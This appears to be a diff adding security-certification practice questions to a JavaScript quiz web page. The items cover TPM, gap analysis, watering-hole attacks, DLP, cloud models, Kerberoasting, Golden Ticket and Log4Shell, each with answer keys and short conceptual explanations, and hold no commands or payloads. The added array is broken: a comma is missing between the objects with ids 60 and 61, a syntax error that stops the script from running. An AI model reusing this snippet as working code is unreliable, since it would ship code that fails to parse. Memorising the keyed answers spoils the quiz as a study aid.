+    options: ["HSM", "TPM", "Secure Enclave", "Smart Card"],
+    correct: 1,
+    explanation: "<strong>TPM (Trusted Platform Module)</strong> — chip on the motherboard storing cryptographic keys and measuring system integrity. BitLocker uses TPM to ensure the drive can only decrypt on the original hardware with an unmodified boot process. Prevents offline attacks — take out the drive and it stays encrypted."
+  },
+  {
+    id: 56,
+    domain: "GOVERNANCE",
+    text: "A company's security team conducts a formal assessment comparing their security practices against the NIST Cybersecurity Framework. What type of activity is this?",
+    options: ["Penetration Test", "Vulnerability Scan", "Security Audit", "Gap Analysis"],
+    correct: 3,
+    explanation: "<strong>Gap Analysis</strong> — comparing current state against a desired standard or framework to identify what's missing. Different from a pen test (active exploitation) or vulnerability scan (automated tool). Produces a roadmap of improvements needed to reach compliance or maturity targets."
+  },
+  {
+    id: 57,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker compromises a website frequently visited by a specific target group — such as an industry forum — to deliver malware to visitors. What attack is this?",
+    options: ["Phishing", "Supply Chain Attack", "Watering Hole Attack", "Drive-by Download"],
+    correct: 2,
+    explanation: "<strong>Watering Hole Attack</strong> — compromise a site the target regularly visits, wait for them to come to you. Highly targeted, difficult to defend against since the malicious site is otherwise legitimate. Named after predators waiting at watering holes."
+  },
+  {
+    id: 58,
+    domain: "IMPLEMENTATION",
+    text: "Which technology monitors network traffic for data that matches sensitive patterns (credit card numbers, SSNs) and can block or alert on unauthorized transmission?",
+    options: ["IDS", "WAF", "DLP", "SIEM"],
+    correct: 2,
+    explanation: "<strong>DLP (Data Loss Prevention)</strong> — inspects content for sensitive data patterns and enforces policy. Can block email attachments containing SSNs, alert on large database exports, or prevent uploading sensitive files to personal cloud storage."
+  },
+  {
+    id: 59,
+    domain: "ARCHITECTURE",
+    text: "An organization segments its network so each server can only communicate with the specific other servers it needs — no broad internal access. What is this called?",
+    options: ["Air Gapping", "Microsegmentation", "VLAN Trunking", "DMZ"],
+    correct: 1,
+    explanation: "<strong>Microsegmentation</strong> — granular network isolation at the workload level. Each server has a specific allow-list of what it can communicate with. Dramatically limits lateral movement — compromising one server doesn't grant access to adjacent systems."
+  },
+  {
+    id: 60,
+    domain: "THREATS & ATTACKS",
+    text: "A user receives a phone call from someone claiming to be IT support, requesting their password to resolve an urgent issue. What type of attack is this?",
+    options: ["Smishing", "Vishing", "Pretexting", "Baiting"],
+    correct: 1,
+    explanation: "<strong>Vishing (Voice Phishing)</strong> — phone-based social engineering. The IT support pretext is common. Note: <strong>Pretexting</strong> is the fabricated scenario (being IT support) — vishing is the delivery channel. Some exams consider these overlapping; the phone call delivery = vishing."
+  }
+  {
+    id: 61,
+    domain: "ARCHITECTURE",
+    text: "In which cloud service model is the customer responsible for patching the operating system?",
+    options: ["SaaS", "PaaS", "IaaS", "All cloud models"],
+    correct: 2,
+    explanation: "<strong>IaaS</strong> — the provider owns physical hardware only. The customer owns and manages the OS, middleware, applications, and data. In PaaS and SaaS the provider manages the OS. The OS is the key differentiator in the shared responsibility model."
+  },
+  {
+    id: 62,
+    domain: "ARCHITECTURE",
+    text: "A developer deploys code to Heroku without managing any servers or OS. What cloud model is this?",
+    options: ["SaaS", "PaaS", "IaaS", "Private Cloud"],
+    correct: 1,
+    explanation: "<strong>PaaS (Platform as a Service)</strong> — provider manages hardware and OS. Developer only manages application and data. Heroku, Google App Engine, AWS Elastic Beanstalk are PaaS examples. Perfect for developers who don't want to manage infrastructure."
+  },
+  {
+    id: 63,
+    domain: "THREATS & ATTACKS",
+    text: "A Java logging library used in millions of applications executed attacker-controlled code embedded in log messages. What vulnerability does this represent?",
+    options: ["SQL Injection", "Vulnerable and Outdated Components", "Security Misconfiguration", "Broken Access Control"],
+    correct: 1,
+    explanation: "<strong>OWASP #6 — Vulnerable and Outdated Components</strong>. Log4Shell (CVE-2021-44228) — Log4j executed JNDI lookup strings embedded in logged input. One malicious string in any logged field triggered remote code execution. Applications inherited the vulnerability without knowing Log4j was present."
+  },
+  {
+    id: 64,
+    domain: "IMPLEMENTATION",
+    text: "A security tool analyzes source code without executing it to find injection vulnerabilities and hardcoded credentials. What type of testing is this?",
+    options: ["DAST", "IAST", "SAST", "Penetration Testing"],
+    correct: 2,
+    explanation: "<strong>SAST (Static Application Security Testing)</strong> — analyzes source code without running the application. Finds vulnerabilities by reading code. Runs early in development. Cannot find runtime issues. DAST tests the running application from outside like an attacker."
+  },
+  {
+    id: 65,
+    domain: "IMPLEMENTATION",
+    text: "An attacker requests Kerberos service tickets for service accounts and takes them offline to crack the passwords. What attack is this?",
+    options: ["Pass the Ticket", "Pass the Hash", "Golden Ticket", "Kerberoasting"],
+    correct: 3,
+    explanation: "<strong>Kerberoasting</strong> — any authenticated domain user can request service tickets encrypted with the service account's password hash. Attacker takes tickets offline and brute forces. Service accounts often have weak, non-expiring passwords making this highly effective."
+  },
+  {
+    id: 66,
+    domain: "IMPLEMENTATION",
+    text: "An attacker compromises the KDC and obtains the KRBTGT hash, allowing them to forge tickets for any user indefinitely. What attack is this?",
+    options: ["Pass the Ticket", "Kerberoasting", "Golden Ticket Attack", "Silver Ticket Attack"],
+    correct: 2,
+    explanation: "<strong>Golden Ticket Attack</strong> — KRBTGT is the Kerberos ticket-granting account. Compromising its hash lets attackers forge valid TGTs for any user including domain admins. Persists even after password resets. Remediation requires resetting KRBTGT password twice."
+  },
+  {
+    id: 67,
+    domain: "IMPLEMENTATION",
+    text: "Which access control model assigns permissions to roles, then assigns users to those roles?",
+    options: ["DAC", "MAC", "RBAC", "ABAC"],
+    correct: 2,
+    explanation: "<strong>RBAC (Role-Based Access Control)</strong> — easiest to manage at scale. Permissions assigned to roles (Admin, HR, Developer), users assigned to roles. Adding a new employee = assign role, they inherit appropriate permissions. MAC uses system-enforced labels. DAC lets resource owners control access."
+  },
+  {
+    id: 68,
+    domain: "IMPLEMENTATION",
+    text: "A web application only accepts numeric input in a phone number field, rejecting any other characters. What security control is this?",
+    options: ["Denylist filtering", "Allowlist input validation", "Output encoding", "Parameterized queries"],
+    correct: 1,
+    explanation: "<strong>Allowlist input validation</strong> — only permits known good input (digits and dashes for a phone number), rejects everything else. Stronger than denylist which tries to block known bad. Allowlist defeats injection attacks by ensuring input can never contain executable syntax."
+  },
+  {
+    id: 69,
+    domain: "IMPLEMENTATION",
+    text: "Which protocol centralizes authentication for network access (VPN, WiFi) using UDP?",
+    options: ["LDAP", "SAML", "RADIUS", "Kerberos"],
+    correct: 2,
+    explanation: "<strong>RADIUS (Remote Authentication Dial-In User Service)</strong> — centralizes authentication, authorization, and accounting (AAA) for network access. Used for VPN authentication, WiFi (WPA2 Enterprise), and network device access. Uses UDP ports 1812/1813."
+  },
+  {
+    id: 70,
+    domain: "ARCHITECTURE",
+    text: "An employee uses a personal cloud storage service to store work files without IT knowledge. What cloud security risk is this?",
+    options: ["Account Hijacking", "Misconfigured Storage Bucket", "Shadow IT", "Vendor Lock-in"],
+    correct: 2,
+    explanation: "<strong>Shadow IT</strong> — employees using unauthorized cloud services without IT visibility or approval. Creates unmanaged attack surfaces, data governance issues, and compliance violations. CASB (Cloud Access Security Broker) is the primary defense — provides visibility and control over cloud service usage."
+  }
+];
+
+// Merge into main bank
+QUESTIONS.push(...EXTRA_QUESTIONS);
+
+// ============================================================
+// INIT
+// ============================================================
+initHome();
+initLessons();
+</script>
+</body>
+</html>
